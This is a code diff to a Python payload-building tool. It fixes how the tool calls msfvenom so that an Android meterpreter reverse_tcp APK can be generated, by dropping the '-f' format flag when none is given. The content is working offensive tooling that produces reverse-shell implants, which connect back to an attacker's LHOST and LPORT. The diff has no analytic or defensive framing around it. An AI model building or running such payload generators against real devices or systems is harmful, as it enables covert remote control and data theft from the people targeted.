@@ -40,14 +40,20 @@ import subprocess
 
 
 def _try_msfvenom(payload: str, lhost: str, lport: int,
-                  fmt: str, out_path: str) -> tuple[bool, str]:
-    """Attempt to run msfvenom; return (success, message)."""
+                  fmt: str | None, out_path: str) -> tuple[bool, str]:
+    """Attempt to run msfvenom; return (success, message).
+
+    fmt=None skips the -f flag (required for Android APK payloads which
+    determine output format from the payload type, not a format string).
+    """
     msf = shutil.which("msfvenom")
     if not msf:
         return False, "msfvenom not found in PATH"
     cmd = [msf, "-p", payload,
-           f"LHOST={lhost}", f"LPORT={lport}",
-           "-f", fmt, "-o", out_path, "-q"]
+           f"LHOST={lhost}", f"LPORT={lport}"]
+    if fmt:
+        cmd += ["-f", fmt]
+    cmd += ["-o", out_path]
     try:
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
         if r.returncode == 0 and os.path.exists(out_path) and os.path.getsize(out_path) > 0:
@@ -162,7 +168,7 @@ def build_android_payload(
         apk_path = os.path.join(output_dir, apk_name)
         if not os.path.exists(apk_path):
             ok, msg = _try_msfvenom(
-                "android/meterpreter/reverse_tcp", lhost, lport, "raw", apk_path)
+                "android/meterpreter/reverse_tcp", lhost, lport, None, apk_path)
             if ok:
                 wrote.append((apk_name, apk_path, f"msfvenom APK  ({os.path.getsize(apk_path):,} bytes)"))
             else:
